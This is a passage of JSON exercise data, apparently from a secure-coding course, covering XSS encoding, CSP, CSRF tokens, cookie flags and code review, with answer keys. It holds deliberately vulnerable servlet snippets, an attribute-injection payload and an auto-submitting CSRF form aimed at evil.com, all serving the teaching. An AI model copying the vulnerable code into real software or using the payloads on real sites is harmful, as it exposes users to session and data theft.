+          "exercise_id": "ex_21",
+          "title": "Exercise 21: Encode Output in a Servlet",
+          "description": "Build real XSS defences.",
+          "difficulty": "beginner",
+          "category": "XSS Defences",
+          "estimated_minutes": 6,
+          "ai_intro": "Now you become the defender! These techniques protect millions of users.",
+          "starter_code": "// VULNERABLE:\nString name = req.getParameter(\"name\");\nString email = req.getParameter(\"email\");\nout.println(\"<h1>Welcome, \" + name + \"</h1>\");\nout.println(\"<p>Email: \" + email + \"</p>\");\nout.println(\"<input value='\" + name + \"' readonly>\");\n\n// Rewrite with output encoding:\n// _____",
+          "expected_output": "out.println(\"<h1>Welcome, \" + encodeHTML(name) + \"</h1>\");\nout.println(\"<p>Email: \" + encodeHTML(email) + \"</p>\");\nout.println(\"<input value='\" + encodeHTML(name) + \"' readonly>\");",
+          "hints": [
+            {
+              "message": "Wrap every variable in encodeHTML() before putting it in out.println()."
+            },
+            {
+              "message": "All three outputs need encoding: name in h1, email in p, name in input value."
+            },
+            {
+              "message": "encodeHTML(name) and encodeHTML(email) for all three lines."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_22",
+          "title": "Exercise 22: Fix a Stored XSS Vulnerability",
+          "description": "Build real XSS defences.",
+          "difficulty": "beginner",
+          "category": "XSS Defences",
+          "estimated_minutes": 6,
+          "ai_intro": "Now you become the defender! These techniques protect millions of users.",
+          "starter_code": "// VULNERABLE comment display:\nResultSet rs = stmt.executeQuery(\"SELECT author, text FROM comments\");\nwhile (rs.next()) {\n    out.println(\"<div class='comment'>\");\n    out.println(\"<b>\" + rs.getString(\"author\") + \"</b>\");\n    out.println(\"<p>\" + rs.getString(\"text\") + \"</p>\");\n    out.println(\"</div>\");\n}\n\n// Fix ALL vulnerable lines:\n// _____",
+          "expected_output": "out.println(\"<b>\" + encodeHTML(rs.getString(\"author\")) + \"</b>\");\nout.println(\"<p>\" + encodeHTML(rs.getString(\"text\")) + \"</p>\");",
+          "hints": [
+            {
+              "message": "Both author and text come from the database and could contain stored XSS."
+            },
+            {
+              "message": "Wrap both rs.getString() calls in encodeHTML()."
+            },
+            {
+              "message": "encodeHTML(rs.getString(\"author\")) and encodeHTML(rs.getString(\"text\"))"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_23",
+          "title": "Exercise 23: Fix DOM-Based XSS",
+          "description": "Build real XSS defences.",
+          "difficulty": "intermediate",
+          "category": "XSS Defences",
+          "estimated_minutes": 6,
+          "ai_intro": "Now you become the defender! These techniques protect millions of users.",
+          "starter_code": "// VULNERABLE:\nvar q = new URLSearchParams(location.search).get('q');\ndocument.getElementById('output').innerHTML = 'Results: ' + q;\n\n// SECURE VERSION:\n// _____\n//\n// What method replaces innerHTML? _____\n// Why is it safe? _____",
+          "expected_output": "document.getElementById('output').textContent = 'Results: ' + q;\ntextContent replaces innerHTML. It treats ALL input as plain text, never HTML.",
+          "hints": [
+            {
+              "message": "textContent treats everything as text, innerHTML treats it as HTML."
+            },
+            {
+              "message": "Replace .innerHTML with .textContent"
+            },
+            {
+              "message": "document.getElementById('output').textContent = 'Results: ' + q; Safe because textContent never interprets HTML."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_24",
+          "title": "Exercise 24: Write a CSP Header",
+          "description": "Build real XSS defences.",
+          "difficulty": "intermediate",
+          "category": "XSS Defences",
+          "estimated_minutes": 6,
+          "ai_intro": "Now you become the defender! These techniques protect millions of users.",
+          "starter_code": "// Write a CSP header that:\n// 1. Only allows scripts from your own domain\n// 2. Only allows styles from your domain and Google Fonts\n// 3. Allows images from anywhere over HTTPS\n// 4. Blocks all iframes\n// 5. Only allows AJAX to your own domain\n//\n// response.setHeader(\"Content-Security-Policy\",\n//     \"_____\");",
+          "expected_output": "default-src 'self'; script-src 'self'; style-src 'self' https://fonts.googleapis.com; img-src https:; frame-src 'none'; connect-src 'self'",
+          "hints": [
+            {
+              "message": "script-src 'self' only allows scripts from your domain."
+            },
+            {
+              "message": "style-src needs 'self' and the Google Fonts URL. img-src https: allows any HTTPS image."
+            },
+            {
+              "message": "default-src 'self'; script-src 'self'; style-src 'self' https://fonts.googleapis.com; img-src https:; frame-src 'none'; connect-src 'self'"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_25",
+          "title": "Exercise 25: Context-Specific Encoding",
+          "description": "Build real XSS defences.",
+          "difficulty": "intermediate",
+          "category": "XSS Defences",
+          "estimated_minutes": 6,
+          "ai_intro": "Now you become the defender! These techniques protect millions of users.",
+          "starter_code": "// The same user input appears in 3 different contexts.\n// Write the correct encoding for each:\n\nString input = \"O'Brien <script>alert(1)</script>\";\n\n// Context 1: HTML body\nout.println(\"<p>\" + _____(input) + \"</p>\");\n\n// Context 2: HTML attribute\nout.println(\"<input value=\\\"\" + _____(input) + \"\\\">\");\n\n// Context 3: JavaScript string\nout.println(\"<script>var name='\" + _____(input) + \"';</script>\");\n\n// Each blank should use: encodeHTML, encodeHTMLAttr, or encodeJS",
+          "expected_output": "Context 1: encodeHTML(input)\nContext 2: encodeHTMLAttr(input)\nContext 3: encodeJS(input)\nEach context needs its own encoding method.",
+          "hints": [
+            {
+              "message": "HTML body uses encodeHTML. Attributes use encodeHTMLAttr. JavaScript uses encodeJS."
+            },
+            {
+              "message": "Each context has different dangerous characters. ' is safe in HTML body but dangerous in JS strings."
+            },
+            {
+              "message": "Body: encodeHTML, Attribute: encodeHTMLAttr, JavaScript: encodeJS. Always match encoding to context."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_26",
+          "title": "Exercise 26: Client-Side Sanitisation",
+          "description": "Build real XSS defences.",
+          "difficulty": "intermediate",
+          "category": "XSS Defences",
+          "estimated_minutes": 9,
+          "ai_intro": "Now you become the defender! These techniques protect millions of users.",
+          "starter_code": "// Write a JavaScript function that sanitises input\n// before inserting into the DOM:\n\nfunction safePrint(elementId, userInput) {\n    // TODO: Get the element\n    // TODO: Set content SAFELY (no innerHTML!)\n    // What method do you use? _____\n}\n\n// Also write a function that strips HTML tags:\nfunction stripTags(input) {\n    // TODO: Use regex to remove ALL HTML tags\n    return input.replace(_____);\n}",
+          "expected_output": "function safePrint(elementId, userInput) {\n    document.getElementById(elementId).textContent = userInput;\n}\nfunction stripTags(input) {\n    return input.replace(/<[^>]*>/g, '');\n}",
+          "hints": [
+            {
+              "message": "textContent is the safest way to insert text into the DOM."
+            },
+            {
+              "message": "To strip tags, use regex: /<[^>]*>/g matches everything between < and >."
+            },
+            {
+              "message": "safePrint uses textContent. stripTags uses input.replace(/<[^>]*>/g, '')."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_27",
+          "title": "Exercise 27: Validate Input for a Comment Form",
+          "description": "Build real XSS defences.",
+          "difficulty": "intermediate",
+          "category": "XSS Defences",
+          "estimated_minutes": 9,
+          "ai_intro": "Now you become the defender! These techniques protect millions of users.",
+          "starter_code": "// Write server-side validation for a comment form:\n// - Comment max 500 characters\n// - Author name: letters, numbers, spaces only, max 50 chars\n// - No HTML tags allowed in author name\n\npublic boolean validateComment(String author, String comment) {\n    // TODO: Validate author\n    // TODO: Validate comment\n    // Return true if valid, false if not\n}",
+          "expected_output": "Validate author: author.matches(\"^[a-zA-Z0-9 ]{1,50}$\")\nValidate comment: comment != null && comment.length() <= 500\nReturn true only if both pass.",
+          "hints": [
+            {
+              "message": "Use regex for author name: only letters, numbers, spaces."
+            },
+            {
+              "message": "Check comment length: must be <= 500 and not null."
+            },
+            {
+              "message": "author.matches(\"^[a-zA-Z0-9 ]{1,50}$\") and comment.length() <= 500"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_28",
+          "title": "Exercise 28: Fix XSS in an Attribute",
+          "description": "Build real XSS defences.",
+          "difficulty": "advanced",
+          "category": "XSS Defences",
+          "estimated_minutes": 9,
+          "ai_intro": "Now you become the defender! These techniques protect millions of users.",
+          "starter_code": "// VULNERABLE:\nString userClass = req.getParameter(\"theme\");\nout.println(\"<div class='\" + userClass + \"'>\");\n\n// Attack: theme = x' onclick='alert(1)' x='\n// Result: <div class='x' onclick='alert(1)' x=''>\n//\n// Fix this code:\n// _____\n//\n// Also, add whitelist validation:\n// Valid themes: light, dark, blue\n// _____",
+          "expected_output": "Encode: out.println(\"<div class='\" + encodeHTML(userClass) + \"'>\")\nWhitelist: Set<String> valid = Set.of(\"light\",\"dark\",\"blue\"); if (!valid.contains(userClass)) throw error;",
+          "hints": [
+            {
+              "message": "Encode the attribute value to prevent quote-breaking."
+            },
+            {
+              "message": "Better yet: whitelist the allowed values."
+            },
+            {
+              "message": "Encode with encodeHTML AND whitelist with Set.of(\"light\",\"dark\",\"blue\")."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_29",
+          "title": "Exercise 29: CSP with Nonce for Inline Scripts",
+          "description": "Build real XSS defences.",
+          "difficulty": "advanced",
+          "category": "XSS Defences",
+          "estimated_minutes": 9,
+          "ai_intro": "Now you become the defender! These techniques protect millions of users.",
+          "starter_code": "// Write CSP that allows ONE specific inline script using a nonce:\n//\n// Step 1: Generate nonce in servlet:\nString nonce = _____;\n//\n// Step 2: Set CSP header with nonce:\nresp.setHeader(\"Content-Security-Policy\",\n    \"script-src 'self' 'nonce-\" + _____ + \"'\");\n//\n// Step 3: Add nonce to allowed script tag:\nout.println(\"<script nonce='\" + _____ + \"'>initPage();</script>\");\n//\n// Injected scripts WITHOUT the nonce are _____",
+          "expected_output": "Generate: SecureRandom + Base64 encoding\nCSP: 'nonce-' + nonce\nScript: <script nonce='...'>\nInjected scripts without nonce are BLOCKED by CSP.",
+          "hints": [
+            {
+              "message": "A nonce is a random value generated per page load."
+            },
+            {
+              "message": "Only scripts with the matching nonce attribute are allowed to run."
+            },
+            {
+              "message": "Generate random nonce, include in CSP header and in the script tag's nonce attribute."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_30",
+          "title": "Exercise 30: Complete XSS Defence Implementation",
+          "description": "Build real XSS defences.",
+          "difficulty": "advanced",
+          "category": "XSS Defences",
+          "estimated_minutes": 9,
+          "ai_intro": "Now you become the defender! These techniques protect millions of users.",
+          "starter_code": "// Build a COMPLETE secure comment system with ALL defences:\n\n// doGet: Display comments securely\n// - Set CSP header\n// - Set secure cookie flags\n// - Generate CSRF token\n// - Encode all output\n\n// doPost: Process new comment\n// - Validate CSRF token\n// - Validate input\n// - Use PreparedStatement\n// - Log the action\n\n// Write the complete servlet:\n// _____",
+          "expected_output": "Complete servlet with CSP + cookie flags + CSRF + encoding + validation + PreparedStatement + logging.",
+          "hints": [
+            {
+              "message": "Combine all techniques: CSP header, cookie flags, CSRF tokens, output encoding."
+            },
+            {
+              "message": "doGet: set headers, generate token, encode output. doPost: validate token, validate input, PreparedStatement."
+            },
+            {
+              "message": "Full implementation with all 7 defence layers."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_31",
+          "title": "Exercise 31: Explain CSRF vs XSS",
+          "description": "Master CSRF and session security.",
+          "difficulty": "beginner",
+          "category": "CSRF & Session Security",
+          "estimated_minutes": 5,
+          "ai_intro": "CSRF and session attacks target how browsers handle authentication. These defences are essential!",
+          "starter_code": "// Fill in the comparison:\n//\n// XSS:\n//   What it does: _____\n//   Where code runs: _____\n//   What it steals: _____\n//   Fix: _____\n//\n// CSRF:\n//   What it does: _____\n//   Where code runs: _____\n//   What it exploits: _____\n//   Fix: _____\n//\n// Can XSS help CSRF? How? _____",
+          "expected_output": "XSS: Injects code into trusted page. Runs in victim's browser on trusted site. Steals cookies/data. Fix: output encoding + CSP.\nCSRF: Tricks browser into unwanted request. Runs on attacker's site. Exploits auto-attached cookies. Fix: CSRF tokens + SameSite.\nYes, XSS can steal CSRF tokens, enabling CSRF attacks.",
+          "hints": [
+            {
+              "message": "XSS injects code INTO the trusted page. CSRF sends requests FROM another page."
+            },
+            {
+              "message": "XSS steals data. CSRF makes unwanted actions. Both exploit browser trust."
+            },
+            {
+              "message": "XSS can steal CSRF tokens because the script runs on the same origin and can read form fields."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_32",
+          "title": "Exercise 32: Trace a CSRF Attack",
+          "description": "Master CSRF and session security.",
+          "difficulty": "beginner",
+          "category": "CSRF & Session Security",
+          "estimated_minutes": 5,
+          "ai_intro": "CSRF and session attacks target how browsers handle authentication. These defences are essential!",
+          "starter_code": "// Victim is logged into email.com\n// Attacker sends victim a link to evil.com\n// evil.com contains:\n// <form action='https://email.com/settings' method='POST'>\n//   <input name='forward_to' value='attacker@evil.com'>\n// </form>\n// <script>document.forms[0].submit()</script>\n//\n// Trace the attack:\n// 1. Victim clicks evil.com link: _____\n// 2. Form auto-submits to: _____\n// 3. Browser includes: _____\n// 4. email.com receives: _____\n// 5. Result: _____",
+          "expected_output": "1. Victim loads evil.com. 2. Form submits to email.com/settings. 3. Browser includes JSESSIONID cookie. 4. email.com sees valid session + forward_to=attacker@evil.com. 5. All victim's emails now forward to attacker!",
+          "hints": [
+            {
+              "message": "The browser adds cookies for email.com to any request going to email.com, regardless of origin."
+            },
+            {
+              "message": "email.com sees a valid session and a settings change request. It processes it."
+            },
+            {
+              "message": "All emails now forward to attacker. The victim never intended this."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_33",
+          "title": "Exercise 33: Write CSRF Token Generator",
+          "description": "Master CSRF and session security.",
+          "difficulty": "intermediate",
+          "category": "CSRF & Session Security",
+          "estimated_minutes": 5,
+          "ai_intro": "CSRF and session attacks target how browsers handle authentication. These defences are essential!",
+          "starter_code": "// Write a Java method that generates a CSRF token:\n// Requirements:\n// - Cryptographically random\n// - 32 bytes of randomness\n// - Base64 URL-safe encoded\n// - Returns a String\n\npublic static String generateCSRFToken() {\n    // TODO\n}",
+          "expected_output": "SecureRandom random = new SecureRandom();\nbyte[] bytes = new byte[32];\nrandom.nextBytes(bytes);\nreturn Base64.getUrlEncoder().encodeToString(bytes);",
+          "hints": [
+            {
+              "message": "Use java.security.SecureRandom for cryptographic randomness."
+            },
+            {
+              "message": "Generate 32 bytes, encode with Base64.getUrlEncoder()."
+            },
+            {
+              "message": "new SecureRandom().nextBytes(bytes); Base64.getUrlEncoder().encodeToString(bytes);"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_34",
+          "title": "Exercise 34: Embed CSRF Token in Form",
+          "description": "Master CSRF and session security.",
+          "difficulty": "intermediate",
+          "category": "CSRF & Session Security",
+          "estimated_minutes": 5,
+          "ai_intro": "CSRF and session attacks target how browsers handle authentication. These defences are essential!",
+          "starter_code": "// Given a CSRF token, embed it in an HTML form:\n// Token value: \"aBcDeFgHiJkLmNoPqRsT\"\n//\n// Write the complete HTML form:\n// - Action: /transfer\n// - Method: POST\n// - Hidden field for CSRF token\n// - Input for amount\n// - Submit button\n\n// Your HTML:\n// _____",
+          "expected_output": "<form action='/transfer' method='POST'>\n<input type='hidden' name='csrf_token' value='aBcDeFgHiJkLmNoPqRsT'>\nAmount: <input name='amount'>\n<button>Transfer</button>\n</form>",
+          "hints": [
+            {
+              "message": "The CSRF token goes in a hidden input field inside the form."
+            },
+            {
+              "message": "<input type='hidden' name='csrf_token' value='...'> before other fields."
+            },
+            {
+              "message": "Complete form with hidden field, amount input, and submit button."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_35",
+          "title": "Exercise 35: Validate CSRF Token",
+          "description": "Master CSRF and session security.",
+          "difficulty": "intermediate",
+          "category": "CSRF & Session Security",
+          "estimated_minutes": 5,
+          "ai_intro": "CSRF and session attacks target how browsers handle authentication. These defences are essential!",
+          "starter_code": "// Write the doPost validation logic:\n\nprotected void doPost(HttpServletRequest req, HttpServletResponse resp) {\n    // TODO: Get token from session\n    // TODO: Get token from form\n    // TODO: Compare them\n    // TODO: Reject if invalid\n    // TODO: Process if valid\n    // TODO: Invalidate used token\n}",
+          "expected_output": "String sToken = (String) req.getSession().getAttribute(\"csrf_token\");\nString fToken = req.getParameter(\"csrf_token\");\nif (sToken == null || !sToken.equals(fToken)) {\n    resp.sendError(403); return;\n}\n// Process request...\nreq.getSession().removeAttribute(\"csrf_token\");",
+          "hints": [
+            {
+              "message": "Get token from session, get token from form parameter, compare them."
+            },
+            {
+              "message": "If they don't match or either is null, send 403 and return immediately."
+            },
+            {
+              "message": "After successful validation, remove the token from session (one-time use)."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_36",
+          "title": "Exercise 36: Set HttpOnly Flag",
+          "description": "Master CSRF and session security.",
+          "difficulty": "intermediate",
+          "category": "CSRF & Session Security",
+          "estimated_minutes": 8,
+          "ai_intro": "CSRF and session attacks target how browsers handle authentication. These defences are essential!",
+          "starter_code": "// Set HttpOnly on the session cookie:\n// Method 1: Using Cookie object\nCookie[] cookies = request.getCookies();\n// TODO: Find JSESSIONID and set HttpOnly\n\n// Method 2: Using response header\n// TODO: Write Set-Cookie header with HttpOnly\n\n// What does HttpOnly prevent? _____\n// What does it NOT prevent? _____",
+          "expected_output": "cookie.setHttpOnly(true); resp.addCookie(cookie);\nOr: Set-Cookie: JSESSIONID=abc123; HttpOnly\nPrevents: XSS cookie theft (document.cookie blocked).\nDoes NOT prevent: CSRF, XSS page defacement, keylogging.",
+          "hints": [
+            {
+              "message": "cookie.setHttpOnly(true) prevents JavaScript from reading the cookie."
+            },
+            {
+              "message": "document.cookie will NOT include JSESSIONID when HttpOnly is set."
+            },
+            {
+              "message": "HttpOnly blocks cookie theft via XSS but does not prevent XSS itself or CSRF."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_37",
+          "title": "Exercise 37: Set Secure and SameSite Flags",
+          "description": "Master CSRF and session security.",
+          "difficulty": "intermediate",
+          "category": "CSRF & Session Security",
+          "estimated_minutes": 8,
+          "ai_intro": "CSRF and session attacks target how browsers handle authentication. These defences are essential!",
+          "starter_code": "// Set ALL three flags on the session cookie:\n// Write the complete Set-Cookie header:\n//\n// Set-Cookie: JSESSIONID=abc123; _____\n//\n// For each flag, explain what attack it prevents:\n// HttpOnly: _____\n// Secure: _____\n// SameSite=Lax: _____",
+          "expected_output": "Set-Cookie: JSESSIONID=abc123; HttpOnly; Secure; SameSite=Lax; Path=/\nHttpOnly: XSS cookie theft. Secure: network interception. SameSite: CSRF.",
+          "hints": [
+            {
+              "message": "Each flag addresses a different attack vector."
+            },
+            {
+              "message": "HttpOnly=XSS, Secure=MITM, SameSite=CSRF."
+            },
+            {
+              "message": "All three together: JSESSIONID=abc123; HttpOnly; Secure; SameSite=Lax; Path=/"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_38",
+          "title": "Exercise 38: Identify CSRF Vulnerable Pages",
+          "description": "Master CSRF and session security.",
+          "difficulty": "advanced",
+          "category": "CSRF & Session Security",
+          "estimated_minutes": 8,
+          "ai_intro": "CSRF and session attacks target how browsers handle authentication. These defences are essential!",
+          "starter_code": "// Which pages need CSRF protection? (YES/NO)\n//\n// 1. Login form (POST): _____\n// 2. Search page (GET): _____\n// 3. Transfer money (POST): _____\n// 4. View profile (GET): _____\n// 5. Change password (POST): _____\n// 6. Delete account (POST): _____\n// 7. Read an article (GET): _____\n// 8. Update email (POST): _____\n//\n// The rule: _____ requests need CSRF tokens",
+          "expected_output": "1:YES 2:NO 3:YES 4:NO 5:YES 6:YES 7:NO 8:YES\nRule: State-changing (POST) requests need CSRF tokens. Read-only (GET) do not.",
+          "hints": [
+            {
+              "message": "CSRF protection is needed on requests that CHANGE state (create, update, delete)."
+            },
+            {
+              "message": "GET requests should be read-only and safe to repeat, so they don't need CSRF tokens."
+            },
+            {
+              "message": "All POST/PUT/DELETE requests that change data need CSRF tokens. GET requests do not."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_39",
+          "title": "Exercise 39: SameSite Cookie Behaviour",
+          "description": "Master CSRF and session security.",
+          "difficulty": "advanced",
+          "category": "CSRF & Session Security",
+          "estimated_minutes": 8,
+          "ai_intro": "CSRF and session attacks target how browsers handle authentication. These defences are essential!",
+          "starter_code": "// SameSite=Strict vs SameSite=Lax:\n//\n// Scenario 1: User clicks a link from email to bank.com\n//   Strict: Cookie sent? _____\n//   Lax: Cookie sent? _____\n//\n// Scenario 2: evil.com auto-submits form to bank.com\n//   Strict: Cookie sent? _____\n//   Lax: Cookie sent? _____\n//\n// Scenario 3: evil.com sends AJAX POST to bank.com\n//   Strict: Cookie sent? _____\n//   Lax: Cookie sent? _____\n//\n// Which is better for a bank? _____\n// Which is better for a blog? _____",
+          "expected_output": "Scenario 1: Strict=NO, Lax=YES. Scenario 2: Strict=NO, Lax=NO. Scenario 3: Strict=NO, Lax=NO.\nBank: Strict (maximum security). Blog: Lax (allows link navigation).",
+          "hints": [
+            {
+              "message": "Strict blocks ALL cross-site cookies. Lax allows top-level navigation (clicking links)."
+            },
+            {
+              "message": "Form submissions from other sites are blocked by both Strict and Lax."
+            },
+            {
+              "message": "Strict: most secure but breaks link navigation. Lax: good balance for most sites."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_40",
+          "title": "Exercise 40: Complete Session Security",
+          "description": "Master CSRF and session security.",
+          "difficulty": "advanced",
+          "category": "CSRF & Session Security",
+          "estimated_minutes": 8,
+          "ai_intro": "CSRF and session attacks target how browsers handle authentication. These defences are essential!",
+          "starter_code": "// Implement COMPLETE session security for a login system:\n// 1. On login: create session, set all cookie flags\n// 2. On each page: generate CSRF token, set CSP\n// 3. On form submit: validate CSRF token\n// 4. On logout: invalidate session\n//\n// Write the code outline:\n// _____",
+          "expected_output": "Login: session + cookie flags. Pages: CSRF token + CSP. Forms: validate token. Logout: session.invalidate().",
+          "hints": [
+            {
+              "message": "Combine session creation, cookie flags, CSRF tokens, and CSP into one system."
+            },
+            {
+              "message": "Login: create session + flags. Each page: CSRF + CSP. Submit: validate. Logout: invalidate."
+            },
+            {
+              "message": "Full lifecycle: authenticate -> secure session -> protect pages -> validate forms -> clean logout."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_41",
+          "title": "Exercise 41: Find XSS in a Servlet",
+          "description": "Find and fix vulnerabilities in real code.",
+          "difficulty": "intermediate",
+          "category": "Code Review & Bug Fixes",
+          "estimated_minutes": 7,
+          "ai_intro": "Code review is one of the most important skills in security. Practice finding every flaw!",
+          "starter_code": "// Find ALL XSS vulnerabilities:\n\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n    String user = req.getParameter(\"user\");          // Line 1\n    String page = req.getParameter(\"page\");          // Line 2\n    PrintWriter out = resp.getWriter();               // Line 3\n    out.println(\"<h1>\" + user + \"'s Page</h1>\");     // Line 4\n    out.println(\"<p>Viewing page: \" + page + \"</p>\"); // Line 5\n    out.println(\"<a href='/profile?u=\" + user + \"'>Profile</a>\"); // Line 6\n}\n\n// Vulnerable lines: _____\n// Fix each one: _____",
+          "expected_output": "Lines 4,5,6 are all vulnerable. Fix: encodeHTML(user), encodeHTML(page), encodeURL(user)",
+          "hints": [
+            {
+              "message": "Every req.getParameter() value that goes into out.println() without encoding is XSS."
+            },
+            {
+              "message": "Line 4: user in heading. Line 5: page in paragraph. Line 6: user in URL."
+            },
+            {
+              "message": "Fix: encodeHTML(user) in lines 4 and 6, encodeHTML(page) in line 5."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_42",
+          "title": "Exercise 42: Find CSRF Vulnerability",
+          "description": "Find and fix vulnerabilities in real code.",
+          "difficulty": "intermediate",
+          "category": "Code Review & Bug Fixes",
+          "estimated_minutes": 7,
+          "ai_intro": "Code review is one of the most important skills in security. Practice finding every flaw!",
+          "starter_code": "// Is this transfer form CSRF-protected? Find the issue:\n\n// doGet:\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp) {\n    out.println(\"<form action='/transfer' method='POST'>\");\n    out.println(\"To: <input name='to'>\");\n    out.println(\"Amount: <input name='amount'>\");\n    out.println(\"<button>Send</button></form>\");\n}\n\n// doPost:\nprotected void doPost(HttpServletRequest req, HttpServletResponse resp) {\n    String to = req.getParameter(\"to\");\n    int amount = Integer.parseInt(req.getParameter(\"amount\"));\n    transfer(getUser(req), to, amount);\n}\n\n// Issue: _____\n// Fix: _____",
+          "expected_output": "No CSRF token! Fix: generate token in doGet, embed as hidden field, validate in doPost before transfer.",
+          "hints": [
+            {
+              "message": "Look for a CSRF token in the form and validation in doPost."
+            },
+            {
+              "message": "There is no hidden field with a token and no validation."
+            },
+            {
+              "message": "Add: generate token in doGet, hidden input in form, validate in doPost before calling transfer()."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_43",
+          "title": "Exercise 43: Fix Cookie Configuration",
+          "description": "Find and fix vulnerabilities in real code.",
+          "difficulty": "intermediate",
+          "category": "Code Review & Bug Fixes",
+          "estimated_minutes": 7,
+          "ai_intro": "Code review is one of the most important skills in security. Practice finding every flaw!",
+          "starter_code": "// Review this cookie configuration:\n// Set-Cookie: JSESSIONID=abc123; Path=/\n//\n// List ALL missing security flags: _____\n// Write the corrected header: _____\n// For each flag, explain what it protects: _____",
+          "expected_output": "Missing: HttpOnly, Secure, SameSite. Fixed: JSESSIONID=abc123; HttpOnly; Secure; SameSite=Lax; Path=/",
+          "hints": [
+            {
+              "message": "A bare session cookie without flags is vulnerable to XSS, MITM, and CSRF."
+            },
+            {
+              "message": "HttpOnly, Secure, and SameSite are all missing."
+            },
+            {
+              "message": "JSESSIONID=abc123; HttpOnly; Secure; SameSite=Lax; Path=/. Each flag protects against a different attack."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_44",
+          "title": "Exercise 44: Security Code Review: Blog",
+          "description": "Find and fix vulnerabilities in real code.",
+          "difficulty": "intermediate",
+          "category": "Code Review & Bug Fixes",
+          "estimated_minutes": 7,
+          "ai_intro": "Code review is one of the most important skills in security. Practice finding every flaw!",
+          "starter_code": "// Review this blog application for ALL security issues:\n\n// Display post:\nString title = getPostTitle(postId); // from database\nString body = getPostBody(postId);   // from database  \nString author = getPostAuthor(postId); // from database\n\nout.println(\"<h1>\" + title + \"</h1>\");\nout.println(\"<p>By \" + author + \"</p>\");\nout.println(\"<div>\" + body + \"</div>\");\n\n// Comment form:\nout.println(\"<form method='POST'>\");\nout.println(\"<textarea name='comment'></textarea>\");\nout.println(\"<button>Post</button></form>\");\n\n// Issues found (there are at least 4):\n// 1. _____\n// 2. _____\n// 3. _____\n// 4. _____",
+          "expected_output": "1. Stored XSS: title/body/author from DB not encoded. 2. No CSRF token on comment form. 3. No CSP header. 4. No input validation on comment.",
+          "hints": [
+            {
+              "message": "Data from the database can contain stored XSS if it was not validated on input."
+            },
+            {
+              "message": "The comment form has no CSRF token. There's no CSP header either."
+            },
+            {
+              "message": "4 issues: unencoded DB output (stored XSS), no CSRF token, no CSP, no input validation."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_45",
+          "title": "Exercise 45: Fix All Vulnerabilities",
+          "description": "Find and fix vulnerabilities in real code.",
+          "difficulty": "intermediate",
+          "category": "Code Review & Bug Fixes",
+          "estimated_minutes": 7,
+          "ai_intro": "Code review is one of the most important skills in security. Practice finding every flaw!",
+          "starter_code": "// Fix ALL vulnerabilities in this code:\n\nString search = req.getParameter(\"q\");\nout.println(\"<p>You searched for: \" + search + \"</p>\");\nout.println(\"<input value='\" + search + \"'>\");\n\n// Also missing:\n// - CSP header\n// - Secure cookie flags\n// Write the COMPLETE fixed version:",
+          "expected_output": "Encode search in both places, add CSP header, set cookie flags.",
+          "hints": [
+            {
+              "message": "Both uses of 'search' need encodeHTML(). Then add security headers."
+            },
+            {
+              "message": "CSP: Content-Security-Policy: default-src 'self'; script-src 'self'"
+            },
+            {
+              "message": "Encode both outputs, add CSP header, set cookie flags on session."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_46",
+          "title": "Exercise 46: Review Client-Side JS",
+          "description": "Find and fix vulnerabilities in real code.",
+          "difficulty": "advanced",
+          "category": "Code Review & Bug Fixes",
+          "estimated_minutes": 10,
+          "ai_intro": "Code review is one of the most important skills in security. Practice finding every flaw!",
+          "starter_code": "// Review this JavaScript for DOM-based XSS:\n\nvar name = new URLSearchParams(location.search).get('name');\nvar bio = new URLSearchParams(location.search).get('bio');\n\ndocument.getElementById('name').innerHTML = name;        // Line 1\ndocument.getElementById('bio').innerHTML = bio;          // Line 2\ndocument.getElementById('title').textContent = name;     // Line 3\n\n// Which lines are vulnerable? _____\n// Which line is safe? _____\n// Fix the vulnerable lines: _____",
+          "expected_output": "Lines 1,2 vulnerable (innerHTML). Line 3 safe (textContent). Fix: change innerHTML to textContent.",
+          "hints": [
+            {
+              "message": "innerHTML interprets HTML (dangerous). textContent does not (safe)."
+            },
+            {
+              "message": "Lines 1 and 2 use innerHTML. Line 3 uses textContent."
+            },
+            {
+              "message": "Change lines 1 and 2 to use textContent instead of innerHTML."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_47",
+          "title": "Exercise 47: CSP Misconfiguration",
+          "description": "Find and fix vulnerabilities in real code.",
+          "difficulty": "advanced",
+          "category": "Code Review & Bug Fixes",
+          "estimated_minutes": 10,
+          "ai_intro": "Code review is one of the most important skills in security. Practice finding every flaw!",
+          "starter_code": "// Is this CSP secure?\n// Content-Security-Policy: script-src 'self' 'unsafe-inline' 'unsafe-eval'\n//\n// What does 'unsafe-inline' allow? _____\n// What does 'unsafe-eval' allow? _____\n// Does this CSP protect against XSS? _____\n// Write a better CSP: _____",
+          "expected_output": "unsafe-inline allows ALL inline scripts (defeats XSS protection!). unsafe-eval allows eval(). This CSP does NOT protect against XSS. Better: script-src 'self' (no unsafe directives).",
+          "hints": [
+            {
+              "message": "'unsafe-inline' defeats the entire purpose of CSP for XSS prevention."
+            },
+            {
+              "message": "It allows ANY inline script to run, including injected XSS scripts."
+            },
+            {
+              "message": "Remove unsafe-inline and unsafe-eval. Use script-src 'self' only, or nonce-based CSP."
+            }
+          ]
+        },
